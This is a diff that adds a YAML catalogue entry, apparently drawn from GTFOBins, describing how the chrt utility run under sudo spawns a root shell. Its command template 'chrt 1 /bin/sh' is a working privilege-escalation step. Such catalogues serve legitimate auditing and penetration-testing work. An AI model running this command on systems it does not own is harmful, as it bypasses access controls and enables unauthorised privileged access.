@@ -1,0 +1,25 @@
+id: gtfobins/chrt/shell/sudo
+type: binary
+platform: linux
+name: chrt
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: chrt 1 /bin/sh
+  comment: Any number between 1 and 99 will do.
+references:
+- https://gtfobins.github.io/gtfobins/chrt/
+tags:
+- linux
+- unix
+- gtfobins
